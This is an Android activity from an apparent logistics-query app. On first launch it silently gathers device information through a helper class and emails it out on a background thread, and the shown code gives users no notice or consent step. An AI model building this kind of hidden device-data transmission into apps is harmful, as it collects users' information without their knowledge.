package com.lanyu96.querylogistics;

import android.content.SharedPreferences;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import com.lanyu96.querylogistics.uitl.DeviceUtil;

import static com.lanyu96.querylogistics.uitl.MailUtil.sendMail;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        init();

    }

    private void init() {
        SharedPreferences sp = getSharedPreferences("FirstRun", MODE_PRIVATE);

        String isFirst = sp.getString("isFirst", "");
        if (isFirst.equals("")) {
            sp.edit().putString("isFirst", "success").apply();
            DeviceUtil deviceUtil = new DeviceUtil();
            StringBuilder stringBuilder = deviceUtil.DeviceInfo(MainActivity.this);

            final String neirong = stringBuilder.toString();
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        sendMail(neirong);
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
            }).start();

        }

    }
}
